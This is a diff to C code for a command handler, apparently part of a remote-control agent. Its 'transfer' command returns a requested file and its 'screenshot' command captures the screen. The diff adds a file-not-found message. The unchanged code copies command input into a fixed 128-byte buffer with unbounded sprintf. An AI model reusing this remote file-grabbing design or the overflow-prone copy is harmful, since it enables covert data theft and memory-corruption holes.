@@ -178,13 +178,19 @@ FILE* processExtCmd(char * cmd, char * cwd, int * replyType){
     }
     else if (strcmp(topCmd, "transfer") == 0) {
         *replyType = 1;
-
         char * temp = cmd;
         temp += (strcspn(cmd, " ")+1); // get the entire second argument whether or not it includes spaces
         char filename[128];
         sprintf(filename, "%s\\%s", cwd, temp);
 
-        return fopen(filename, "rb");
+        FILE *fp = fopen(filename, "rb");
+        // determine if the file exists or not and act accordingly
+        if (fp == NULL){
+            return getTempFile("File not found. Make sure to use a proper relative path.\n");
+        }
+        else{
+            return fp;
+        }
     }
     else if (strcmp(topCmd, "screenshot") == 0){
         *replyType = 1;
@@ -287,7 +293,6 @@ char* getCmdOutStr(char * cmd, int REPLY_MAX_SIZE){
 
 /*
 Returns a pointer to a temp file created with the given text written into it
-The name/path of the file is placed into the filename parameter
 */
 FILE* getTempFile(char * string){
    FILE* file;
